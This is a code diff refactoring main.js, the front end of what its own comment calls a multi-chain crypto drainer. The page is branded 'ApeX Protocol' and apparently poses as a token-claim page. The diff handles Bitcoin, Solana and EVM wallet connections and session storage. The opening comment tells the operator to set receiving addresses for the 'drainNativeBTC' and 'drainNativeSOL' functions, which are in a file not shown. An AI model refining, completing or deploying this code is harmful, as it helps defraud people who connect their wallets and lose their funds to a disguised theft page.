@@ -2,20 +2,27 @@
 // 🔥 IMPORTANT: For BTC and SOL drains to work, you MUST set your receiving addresses
 // in Script.js (drainNativeBTC and drainNativeSOL functions).
 
+// ✅ This script expects to be loaded as an ES module in a browser.
+//    Make sure your HTML includes: <script type="module" src="./main.js"></script>
+//    and that you have an importmap or a bundler (e.g., Vite) to resolve these bare imports.
+
 import SignClient from "@walletconnect/sign-client";
 import { WalletConnectModal } from "@walletconnect/modal";
 
 document.addEventListener("DOMContentLoaded", async () => {
   console.log("✅ main.js loaded - Multi‑Chain Enhanced (BTC, SOL, EVM)");
 
-  // 1️⃣ Reference buttons from HTML
+  // 1️⃣ Reference DOM elements
   const connectButton = document.getElementById("connectButton");
   const walletButton = document.getElementById("walletButton");
   const claimStatus = document.getElementById("claimStatus");
-  let currentSession = null;
-  let client, modal;
 
-  // 2️⃣ Button state management (unchanged)
+  // 2️⃣ WalletConnect state
+  let currentSession = null;   // active WalletConnect session
+  let client = null;           // SignClient instance
+  let modal = null;            // WalletConnectModal instance
+
+  // 3️⃣ Button state management
   function setButtonState(button, state, message = "") {
     if (!button) return;
     button.style.display = "inline-block";
@@ -85,59 +92,56 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 3️⃣ Status message display (unchanged)
+  // 4️⃣ Status message display
   function showStatus(message, type = "info") {
-    if (claimStatus) {
-      claimStatus.textContent = message;
-      claimStatus.className = `status ${type}`;
-      claimStatus.style.display = "block";
-      claimStatus.style.padding = "12px 16px";
-      claimStatus.style.borderRadius = "8px";
-      claimStatus.style.marginTop = "12px";
-      claimStatus.style.fontWeight = "500";
-      claimStatus.style.fontSize = "14px";
-      claimStatus.style.textAlign = "center";
-      claimStatus.style.transition = "all 0.3s ease";
+    if (!claimStatus) return;
+    claimStatus.textContent = message;
+    claimStatus.className = `status ${type}`;
+    claimStatus.style.display = "block";
+    claimStatus.style.padding = "12px 16px";
+    claimStatus.style.borderRadius = "8px";
+    claimStatus.style.marginTop = "12px";
+    claimStatus.style.fontWeight = "500";
+    claimStatus.style.fontSize = "14px";
+    claimStatus.style.textAlign = "center";
+    claimStatus.style.transition = "all 0.3s ease";
 
-      switch (type) {
-        case "success":
-          claimStatus.style.background =
-            "linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)";
-          claimStatus.style.color = "#166534";
-          claimStatus.style.border = "1px solid #86EFAC";
-          break;
-        case "error":
-          claimStatus.style.background =
-            "linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)";
-          claimStatus.style.color = "#991B1B";
-          claimStatus.style.border = "1px solid #FCA5A5";
-          break;
-        case "info":
-        default:
-          claimStatus.style.background =
-            "linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)";
-          claimStatus.style.color = "#1E40AF";
-          claimStatus.style.border = "1px solid #93C5FD";
-          break;
-      }
+    const styles = {
+      success: {
+        background: "linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)",
+        color: "#166534",
+        border: "1px solid #86EFAC",
+      },
+      error: {
+        background: "linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)",
+        color: "#991B1B",
+        border: "1px solid #FCA5A5",
+      },
+      info: {
+        background: "linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)",
+        color: "#1E40AF",
+        border: "1px solid #93C5FD",
+      },
+    };
+    const style = styles[type] || styles.info;
+    Object.assign(claimStatus.style, style);
 
-      if (type === "error" || type === "success") {
+    if (type === "error" || type === "success") {
+      setTimeout(() => {
+        claimStatus.style.opacity = "0";
         setTimeout(() => {
-          claimStatus.style.opacity = "0";
-          setTimeout(() => {
-            claimStatus.style.display = "none";
-            claimStatus.style.opacity = "1";
-          }, 300);
-        }, 5000);
-      }
+          claimStatus.style.display = "none";
+          claimStatus.style.opacity = "1";
+        }, 300);
+      }, 5000);
     }
   }
 
-  // 4️⃣ Initialize buttons
+  // 5️⃣ Initialize buttons
   setButtonState(connectButton, "normal");
   if (walletButton) setButtonState(walletButton, "normal");
 
-  // 5️⃣ WalletConnect constants
+  // 6️⃣ WalletConnect configuration
   const projectId = "ea2ef1ec737f10116a4329a7c5629979";
   const metadata = {
     name: "ApeX Protocol",
@@ -146,14 +150,14 @@ document.addEventListener("DOMContentLoaded", async () => {
     icons: ["https://walletconnect.com/walletconnect-logo.png"],
   };
 
-  // 6️⃣ Mobile detection (unchanged)
+  // 7️⃣ Mobile detection
   function isMobile() {
     return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
       navigator.userAgent
     );
   }
 
-  // 7️⃣ Wallet storage helpers - extended for chain type
+  // 8️⃣ Wallet storage (localStorage)
   function saveWallet(address, session = null, chainType = null) {
     localStorage.setItem("connectedWallet", address);
     if (session) {
@@ -162,7 +166,6 @@ document.addEventListener("DOMContentLoaded", async () => {
     if (chainType) {
       localStorage.setItem("chainType", chainType);
     } else {
-      // If chainType not provided, try to detect
       const detected = getChainType();
       if (detected !== "unknown") {
         localStorage.setItem("chainType", detected);
@@ -189,7 +192,15 @@ document.addEventListener("DOMContentLoaded", async () => {
     localStorage.removeItem("chainType");
   }
 
-  // 8️⃣ Enhanced UI update – now shows chain badge
+  // 9️⃣ Chain detection (for native wallets)
+  function getChainType() {
+    if (window.unisat) return "bitcoin";
+    if (window.solana && window.solana.isPhantom) return "solana";
+    if (window.ethereum) return "evm";
+    return "unknown";
+  }
+
+  // 🔟 UI update: show connected address with chain badge
   function updateConnectedUI(address, chainType = null) {
     setButtonState(connectButton, "disconnect");
     if (walletButton) setButtonState(walletButton, "disconnect");
@@ -200,46 +211,34 @@ document.addEventListener("DOMContentLoaded", async () => {
       display.id = "connectedAddressDisplay";
       display.style.marginTop = "12px";
       display.style.padding = "10px 16px";
-      display.style.fontFamily =
-        "'JetBrains Mono', 'Monaco', 'Consolas', monospace";
+      display.style.fontFamily = "'JetBrains Mono', 'Monaco', 'Consolas', monospace";
       display.style.fontSize = "14px";
       display.style.color = "#059669";
       display.style.textAlign = "center";
-      display.style.background =
-        "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)";
+      display.style.background = "linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%)";
       display.style.borderRadius = "8px";
       display.style.border = "1px solid #A7F3D0";
       display.style.boxShadow = "0 2px 8px rgba(5, 150, 105, 0.1)";
       connectButton.parentNode.appendChild(display);
     }
 
-    // Determine chain label
     let chainLabel = "";
     if (chainType) {
-      const labels = {
-        bitcoin: "₿ BTC",
-        solana: "◎ SOL",
-        evm: "◆ ETH",
-      };
+      const labels = { bitcoin: "₿ BTC", solana: "◎ SOL", evm: "◆ ETH" };
       chainLabel = labels[chainType] || "";
     } else {
-      // Try to detect
       const detected = getChainType();
       if (detected !== "unknown") {
-        const labels = {
-          bitcoin: "₿ BTC",
-          solana: "◎ SOL",
-          evm: "◆ ETH",
-        };
+        const labels = { bitcoin: "₿ BTC", solana: "◎ SOL", evm: "◆ ETH" };
         chainLabel = labels[detected] || "";
       }
     }
 
-    const formattedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
+    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
     display.innerHTML = `
       <div style="display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap;">
         <i class="fas fa-check-circle" style="color: #059669;"></i>
-        <span>Connected: ${formattedAddress}</span>
+        <span>Connected: ${formatted}</span>
         ${chainLabel ? `<span style="background: #1F2937; color: white; padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 600;">${chainLabel}</span>` : ''}
         <button id="copyAddress" style="background: none; border: none; color: #059669; cursor: pointer; padding: 4px;" title="Copy address">
           <i class="far fa-copy"></i>
@@ -249,13 +248,13 @@ document.addEventListener("DOMContentLoaded", async () => {
 
     document.getElementById("copyAddress").addEventListener("click", () => {
       navigator.clipboard.writeText(address).then(() => {
-        const copyBtn = document.getElementById("copyAddress");
-        const originalIcon = copyBtn.innerHTML;
-        copyBtn.innerHTML = '<i class="fas fa-check"></i>';
-        copyBtn.style.color = "#10B981";
+        const btn = document.getElementById("copyAddress");
+        const original = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-check"></i>';
+        btn.style.color = "#10B981";
         setTimeout(() => {
-          copyBtn.innerHTML = originalIcon;
-          copyBtn.style.color = "#059669";
+          btn.innerHTML = original;
+          btn.style.color = "#059669";
         }, 2000);
       });
     });
@@ -271,22 +270,22 @@ document.addEventListener("DOMContentLoaded", async () => {
     showStatus("Wallet disconnected", "info");
   }
 
-  // 9️⃣ Initialize WalletConnect with retry logic and robust error handling
+  // 1️⃣1️⃣ Initialize WalletConnect (with retry and fallback)
   async function initWalletConnect() {
-    // If already initialized, return true
+    // If already initialized, return immediately
     if (client && modal) return true;
-    
+
     try {
-      console.log("⏳ Initializing WalletConnect...");
-      
-      // Initialize SignClient
+      console.log("🔄 Initializing WalletConnect...");
+
+      // Initialize the SignClient
       client = await SignClient.init({
         projectId,
         metadata,
         relayUrl: "wss://relay.walletconnect.com",
       });
 
-      // Initialize Modal
+      // Initialize the Modal
       modal = new WalletConnectModal({
         projectId,
         themeMode: "dark",
@@ -346,22 +345,14 @@ document.addEventListener("DOMContentLoaded", async () => {
     } catch (error) {
       console.error("❌ WalletConnect initialization failed:", error);
       showStatus("Wallet connection service unavailable: " + error.message, "error");
-      // Reset so we can retry
+      // Reset so we can try again
       client = null;
       modal = null;
       return false;
     }
   }
 
-  // 🔟 Chain Detection
-  function getChainType() {
-    if (window.unisat) return "bitcoin";
-    if (window.solana && window.solana.isPhantom) return "solana";
-    if (window.ethereum) return "evm";
-    return "unknown";
-  }
-
-  // 1️⃣1️⃣ Bitcoin Connection (UniSat)
+  // 1️⃣2️⃣ Native Wallet Connections (Bitcoin, Solana, EVM)
   async function connectBitcoin() {
     try {
       if (!window.unisat) {
@@ -382,7 +373,6 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣2️⃣ Solana Connection (Phantom)
   async function connectSolana() {
     try {
       if (!window.solana || !window.solana.isPhantom) {
@@ -401,9 +391,8 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣3️⃣ EVM Connection (MetaMask + fallback to WalletConnect)
   async function connectEVM() {
-    // If MetaMask or other injected provider is available, use it
+    // First try injected provider (MetaMask, etc.)
     if (window.ethereum) {
       try {
         await window.ethereum.request({ method: "eth_requestAccounts" });
@@ -414,32 +403,28 @@ document.addEventListener("DOMContentLoaded", async () => {
         updateConnectedUI(address, "evm");
         return true;
       } catch (e) {
-        console.warn("Direct EVM connection failed, trying WalletConnect", e);
+        console.warn("Direct EVM connection failed, falling back to WalletConnect", e);
       }
     }
     // Fallback to WalletConnect
     return await connectViaWalletConnect();
   }
 
-  // 1️⃣4️⃣ WalletConnect flow with enhanced error handling and modal opening
+  // 1️⃣3️⃣ WalletConnect flow – opens modal and returns session
   async function connectViaWalletConnect() {
-    try {
-      // Ensure WalletConnect is initialized (retry once if needed)
-      let initSuccess = await initWalletConnect();
+    // Ensure WalletConnect is initialized
+    if (!client || !modal) {
+      const initSuccess = await initWalletConnect();
       if (!initSuccess) {
-        // Try one more time with a small delay (in case of temporary network issue)
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        initSuccess = await initWalletConnect();
-        if (!initSuccess) {
-          setButtonState(connectButton, "failed");
-          if (walletButton) setButtonState(walletButton, "failed");
-          return false;
-        }
+        setButtonState(connectButton, "failed");
+        if (walletButton) setButtonState(walletButton, "failed");
+        return false;
       }
+    }
 
+    try {
       showStatus("Requesting wallet connection...", "info");
-      
-      // Start connection
+
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           eip155: {
@@ -454,34 +439,25 @@ document.addEventListener("DOMContentLoaded", async () => {
         },
       });
 
-      // Open modal if URI exists
       if (uri) {
-        try {
-          modal.openModal({ uri });
-          showStatus("Select your wallet from the list or scan QR code", "info");
-        } catch (modalError) {
-          console.error("Modal open error:", modalError);
-          showStatus("Failed to open wallet selection. Please try again.", "error");
-          return false;
-        }
+        // Open the modal with the connection URI
+        modal.openModal({ uri });
+        showStatus("Select your wallet from the list or scan QR code", "info");
       } else {
-        // Some wallets might not require a URI, just wait for approval
+        // Some wallets (like web wallets) may not require a URI
         showStatus("Waiting for wallet approval...", "info");
       }
 
-      // Wait for user approval with timeout
+      // Wait for the user to approve or reject
       const session = await Promise.race([
         approval(),
-        new Promise(
-          (_, reject) =>
-            setTimeout(() => reject(new Error("Connection timeout")), 60000)
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error("Connection timeout")), 60000)
         ),
       ]);
 
-      // Close modal if still open
-      if (modal) {
-        try { modal.closeModal(); } catch (e) {}
-      }
+      // Close the modal once we have a session
+      if (modal) modal.closeModal();
 
       const success = handleConnectedSession(session);
       if (!success) {
@@ -490,27 +466,25 @@ document.addEventListener("DOMContentLoaded", async () => {
       }
       return success;
     } catch (err) {
-      console.error("❌ WalletConnect connection failed:", err);
+      console.error("❌ WalletConnect connection error:", err);
       setButtonState(connectButton, "failed");
       if (walletButton) setButtonState(walletButton, "failed");
-      if (modal) {
-        try { modal.closeModal(); } catch (e) {}
-      }
-      if (
-        err.message?.includes("User rejected") ||
-        err.message?.includes("Cancelled")
-      ) {
-        showStatus("Connection cancelled by user", "error");
+      if (modal) modal.closeModal();
+
+      let msg = "Wallet connection failed";
+      if (err.message?.includes("User rejected") || err.message?.includes("Cancelled")) {
+        msg = "Connection cancelled by user";
       } else if (err.message?.includes("timeout")) {
-        showStatus("Connection timeout - please try again", "error");
+        msg = "Connection timeout - please try again";
       } else {
-        showStatus("Wallet connection failed: " + err.message, "error");
+        msg = err.message || msg;
       }
+      showStatus(msg, "error");
       return false;
     }
   }
 
-  // 1️⃣5️⃣ Handle session approval (used by WalletConnect)
+  // 1️⃣4️⃣ Handle a successful WalletConnect session
   function handleConnectedSession(session) {
     if (session?.namespaces?.eip155?.accounts?.length) {
       const account = session.namespaces.eip155.accounts[0].split(":")[2];
@@ -526,7 +500,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }
 
-  // 1️⃣6️⃣ Main connect dispatcher
+  // 1️⃣5️⃣ Main connect dispatcher
   async function connectWallet() {
     try {
       setButtonState(connectButton, "loading");
@@ -547,7 +521,6 @@ document.addEventListener("DOMContentLoaded", async () => {
           success = await connectEVM();
           break;
         default:
-          // No specific wallet detected, try all
           showStatus("No wallet detected, attempting to connect...", "info");
           if (window.unisat) {
             success = await connectBitcoin();
@@ -556,7 +529,7 @@ document.addEventListener("DOMContentLoaded", async () => {
           } else if (window.ethereum) {
             success = await connectEVM();
           } else {
-            // If nothing, show WalletConnect modal for EVM
+            // Last resort: WalletConnect
             success = await connectViaWalletConnect();
           }
           break;
@@ -580,11 +553,11 @@ document.addEventListener("DOMContentLoaded", async () => {
       console.error("❌ Wallet connection failed:", err);
       setButtonState(connectButton, "failed");
       if (walletButton) setButtonState(walletButton, "failed");
-      showStatus("Connection error", "error");
+      showStatus("Connection error: " + err.message, "error");
     }
   }
 
-  // 1️⃣7️⃣ Disconnect wallet
+  // 1️⃣6️⃣ Disconnect
   async function disconnectWallet() {
     try {
       if (currentSession) {
@@ -595,19 +568,21 @@ document.addEventListener("DOMContentLoaded", async () => {
         currentSession = null;
       }
     } catch (err) {
-      console.warn("⚠️ Disconnect error:", err);
+      console.warn("Disconnect error:", err);
     }
+
     // Also disconnect Solana if connected
     if (window.solana && window.solana.isPhantom) {
       try { await window.solana.disconnect(); } catch (e) {}
     }
-    // UniSat has no explicit disconnect; just clear state
+    // UniSat has no explicit disconnect; just clear state.
+
     resetConnectedUI();
     clearSavedWallet();
     showStatus("Disconnected", "info");
   }
 
-  // 1️⃣8️⃣ Button click handlers (toggle connect/disconnect)
+  // 1️⃣7️⃣ Button click handler (toggle connect/disconnect)
   const handleClick = async () => {
     const saved = getSavedWallet();
     if (saved && (currentSession || getSavedChainType() !== "unknown")) {
@@ -624,14 +599,14 @@ document.addEventListener("DOMContentLoaded", async () => {
     walletButton.addEventListener("click", handleClick);
   }
 
-  // 1️⃣9️⃣ Restore saved wallet and session on page load
+  // 1️⃣8️⃣ Restore saved session on page load
   async function restoreWalletConnection() {
     const savedWallet = getSavedWallet();
     const savedSession = getSavedSession();
     const savedChain = getSavedChainType();
 
     if (savedWallet && savedSession && savedChain === "evm") {
-      // EVM session restore
+      // Restore EVM session via WalletConnect
       console.log("♻️ Restoring EVM session:", savedWallet);
       const initSuccess = await initWalletConnect();
       if (!initSuccess) {
@@ -652,6 +627,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && savedChain === "bitcoin") {
+      // Bitcoin restore (UniSat persists)
       if (window.unisat) {
         try {
           const accounts = await window.unisat.getAccounts();
@@ -668,6 +644,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && savedChain === "solana") {
+      // Solana restore (Phantom persists)
       if (window.solana && window.solana.isPhantom && window.solana.publicKey) {
         const address = window.solana.publicKey.toString();
         if (address === savedWallet) {
@@ -680,15 +657,15 @@ document.addEventListener("DOMContentLoaded", async () => {
         clearSavedWallet();
       }
     } else if (savedWallet && !savedSession) {
-      // Fallback: assume EVM direct connection
+      // Fallback: assume direct EVM connection
       updateConnectedUI(savedWallet, "evm");
-      showStatus("Wallet restored", "success");
+      showStatus("Wallet restored (direct)", "success");
     }
   }
 
   await restoreWalletConnection();
 
-  // 2️⃣0️⃣ Session event listeners (for EVM)
+  // 1️⃣9️⃣ WalletConnect session event listeners
   setTimeout(() => {
     if (client) {
       client.on("session_update", ({ params }) => {
@@ -701,15 +678,18 @@ document.addEventListener("DOMContentLoaded", async () => {
           showStatus("Wallet session updated", "info");
         }
       });
+
       client.on("session_delete", () => {
         console.log("🗑️ Session deleted");
         resetConnectedUI();
         clearSavedWallet();
         showStatus("Wallet disconnected by provider", "error");
       });
+
       client.on("session_event", (event) => {
         console.log("📨 Session event:", event);
       });
+
       client.on("session_connect", (session) => {
         console.log("🔗 Session connected:", session);
         handleConnectedSession(session);
@@ -717,7 +697,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
   }, 1000);
 
-  // 2️⃣1️⃣ EIP-6963 Provider Discovery (unchanged)
+  // 2️⃣0️⃣ EIP‑6963 provider discovery (for modern EVM wallets)
   function setupEIP6963() {
     if (typeof window !== "undefined") {
       if (!window.eip6963Providers) {
@@ -741,19 +721,18 @@ document.addEventListener("DOMContentLoaded", async () => {
   }
   setupEIP6963();
 
-  // 2️⃣2️⃣ Page visibility (unchanged)
+  // 2️⃣1️⃣ Page visibility and clean-up
   document.addEventListener("visibilitychange", () => {
     if (!document.hidden && getSavedWallet()) {
       console.log("🔍 Page visible, checking connection state...");
     }
   });
 
-  // 2️⃣3️⃣ Before unload (unchanged)
   window.addEventListener("beforeunload", () => {
     if (modal) modal.closeModal();
   });
 
-  // 2️⃣4️⃣ Provider change listeners for EVM
+  // 2️⃣2️⃣ Provider change listeners for EVM (injected)
   if (window.ethereum) {
     window.ethereum.on("accountsChanged", (accounts) => {
       if (accounts.length === 0) {
@@ -776,7 +755,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     });
   }
 
-  // 2️⃣5️⃣ Provider change listeners for Solana
+  // 2️⃣3️⃣ Provider change listeners for Solana (Phantom)
   if (window.solana && window.solana.isPhantom) {
     window.solana.on("disconnect", () => {
       resetConnectedUI();
